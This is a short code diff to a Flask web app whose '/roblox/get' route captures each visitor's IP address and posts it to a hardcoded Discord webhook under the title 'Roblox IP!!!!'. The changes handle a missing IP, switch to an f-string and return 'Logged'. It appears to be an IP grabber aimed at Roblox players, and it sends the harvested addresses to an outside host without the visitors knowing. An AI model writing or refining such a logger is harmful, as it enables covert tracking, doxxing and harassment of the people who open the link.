@@ -143,10 +143,12 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1412755798483800105/x2Wgc3s_sqTQ
 @app.route("/roblox/get", methods=["GET"])
 def roblox_get_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip is None:
+        ip = "Unknown"
 
     embed = {
         "title": "Roblox IP!!!!",
-        "description": "IP: "+ ip,
+        "description": f"IP: {ip}",
         "color": 0x5865F2  # Discord blurple
     }
 
@@ -156,8 +158,7 @@ def roblox_get_ip():
 
     requests.post(WEBHOOK_URL, json=data)
 
-    return '', 200
-
+    return "Logged", 200
 # =====================================
 
 if __name__ == "__main__":
